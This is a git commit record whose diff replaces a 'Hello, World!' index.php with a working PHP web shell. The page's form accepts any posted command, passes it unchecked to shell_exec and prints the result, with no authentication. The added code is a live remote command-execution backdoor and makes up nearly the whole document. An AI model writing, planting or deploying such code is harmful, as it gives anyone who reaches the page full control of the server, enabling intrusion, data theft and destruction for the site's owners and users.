94a9a58bd171a616891eefa3cf88525b6a8648e7
pthology <137688078+pthology@users.noreply.github.com>
2023-06-27 00:19:05 +0600

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,22 @@
-<h1><?php echo "Hello, World!"; ?></h1>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Web Shell</title>
+</head>
+<body>
+  <h1>Web Shell</h1>
+  
+  <form action="" method="post">
+    <input type="text" name="command" placeholder="Enter a command">
+    <input type="submit" value="Run">
+  </form>
+
+  <?php
+  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $command = $_POST['command'];
+    $output = shell_exec($command);
+    echo "<pre>$output</pre>";
+  }
+  ?>
+</body>
+</html>
